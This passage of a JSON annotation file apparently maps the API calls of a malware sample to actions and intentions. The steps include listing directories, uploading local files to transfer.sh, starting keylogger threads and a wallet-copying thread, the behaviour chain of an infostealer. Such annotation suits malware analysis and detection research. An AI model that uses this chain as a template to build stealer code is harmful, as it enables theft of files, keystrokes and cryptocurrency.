              "action_id": "check_file_is_file",
              "object": "pathF + \"/\" + file",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine_file_presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "bc_uploadanonfiles()",
              "action_description": "Uploads file to transfer.sh and returns URL",
              "action_id": "upload_file_transfer_sh",
              "object": "pathF + \"/\" + file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Transmit_file_data_server",
              "intention_id": "transmit_file_data_server"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List_directory_files",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "path + \"/\" + file",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine_file_presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "os.path.isdir()",
              "action_description": "Checks if specified path exists and is a directory",
              "action_id": "check_directory_exists",
              "object": "path + \"/\" + file",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine_directory_presence",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=bc_create_file, args=[patt, key_wordsFiles]",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run_function_thread_pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "thread.start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Start_keylogger_thread",
              "intention_id": "start_keylogger_thread"
            },
            {
              "action_api": "thread.join()",
              "action_description": "Waits for thread to finish execution",
              "action_id": "wait_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Wait_for_events",
              "intention_id": "wait_for_events"
            },
            {
              "action_api": "time.sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "0.2",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Delay_next_operation",
              "intention_id": "delay_next_operation"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=auto_copy_wallet().run",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run_function_thread_pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "auto.start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Start_keylogger_thread",
              "intention_id": "start_keylogger_thread"
            }
          ]
        }
      ]
    }
  ]
}